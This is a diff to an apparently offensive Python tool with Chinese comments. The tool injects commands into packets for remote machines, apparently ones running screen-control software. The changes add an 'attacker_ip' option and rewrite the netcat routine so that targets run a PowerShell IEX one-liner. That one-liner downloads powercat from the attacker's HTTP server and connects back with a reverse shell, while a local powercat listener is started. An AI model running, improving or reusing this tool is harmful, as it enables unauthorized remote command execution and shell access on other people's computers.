@@ -7,6 +7,7 @@ from time import sleep #time库: 时间库  sleep: 休眠函数
 from struct import pack #struct库: 处理二进制数据  pack: 打包二进制数据
 from os import popen, system #os库: 系统交互库  popen:执行cmd命令并返回输出  system:调用系统shell
 from multiprocessing import Pool #multiprocessing库: 多线程库  Pool:进程池
+import base64
 
 print("\n程序正在运行，请等待!\n")
 
@@ -157,6 +158,7 @@ parser.add_argument(
     '-c', type=str, help="命令 eg: -c   \"cmd.exe /c ipconfig\"")
 parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
 parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+parser.add_argument('-lip', '--local-ip', type=str, help="指定本机内网IP地址（用于HTTP服务和反弹连接），例如 192.168.110.28") #反弹Shell所需的文件分发服务器IP
 
 parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="加载额外的选项"
                     )
@@ -168,6 +170,7 @@ subparsers.add_parser('break', help='脱离屏幕控制，需要管理员权限'
 subparsers.add_parser('continue', help='恢复屏幕控制')
 
 args = parser.parse_args()
+print(args)
 
 
 # 格式化要发送的消息
@@ -255,7 +258,14 @@ def pkg_sendlist(cmdtype, content):
     elif cmdtype == '-c':
         index = 578
         result = basicCMD['-c']
+        max_len = len(result) - index  # 剩余可用字节数
+        print(f"[DEBUG] 命令原始长度: {len(arrs)} 字节，最大允许: {max_len} 字节")
+        if len(arrs) > max_len:
+            print("[!] 警告：命令过长，将被截断！")
         for elem in arrs:
+            if index >= len(result):
+                print("[!] 错误：命令超出缓冲区，已丢弃多余部分")
+                break
             result[index] = elem
             index += 1
     return result
@@ -281,6 +291,7 @@ def send(send_list):
             print("第%s次执行完毕" % str(times + 1))
         if times != args.l - 1:
             sleep(args.t)
+    print(f"数据包总长度: {len(abc)}，命令填充起始位置: 578，命令长度: {len(cmd)}")
 
 
 def creat_send_object():
@@ -339,12 +350,21 @@ def single_command():
 
 def netcat(num):
     send_list = []
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
+    if args.local_ip:
+        attacker_ip = args.local_ip
+        print(f"获取ip地址为:{attacker_ip}")
+    else:
+        hostname = socket.gethostname()
+        attacker_ip = socket.gethostbyname(hostname)
+        print(f"[!] 未指定 -lip，自动获取的本机 IP 为 {attacker_ip}，请确保目标能访问此 IP！")
+    
+    # 最短命令：使用 -c 代替 -Command，去掉 .exe，文件名用 p.ps1
+    url = f"http://{attacker_ip}:8000/p.ps1"
+    cmd = f'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'{url}\'); powercat -c {attacker_ip} -p {num} -e powershell"'
+    
+    print(f"远程下载命令已发送! 命令长度: {len(cmd)} 字符")
     send_list.append(pkg_sendlist('-c', cmd))
     send(send_list)
-
 
 def run_from_cmd():
     try:
@@ -352,13 +372,22 @@ def run_from_cmd():
         if args.e != 'nc':
             send_list = creat_send_object()
             send(send_list)
-            #sys.exit(0)
         else:
-            num = random.randint(1, 65535)
+            num = 65535  # 固定端口，也可改为随机但建议固定
+            # 确定本地IP
+            if args.local_ip:
+                attacker_ip = args.local_ip
+            else:
+                hostname = socket.gethostname()
+                attacker_ip = socket.gethostbyname(hostname)
+                print(f"[!] 未指定 -lip，自动获取的本机 IP 为 {attacker_ip}，请确保目标能访问此 IP！")
             pool = Pool(processes=1)
             pool.apply_async(netcat, (num,))
-            print("listening on [any] {} ...".format(num))
-            system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
+            print(f"listening on {num} ...")
+            # 启动监听（新窗口）
+            # 这里的http连接是本地服务器,所以必须开一个本地服务器且端口是8000
+            system(f'start powershell -NoExit -NoProfile -Command "chcp 936 > $null; IEX (New-Object System.Net.WebClient).DownloadString(\'http://{attacker_ip}:8000/p.ps1\'); powercat -l -p {num}"')
+            print(f"本地监听Powershell已运行!,已连接:http://{attacker_ip}:8000/powercat.ps1,端口:{num}")
             pool.close()
             pool.join()
     except Exception as e:
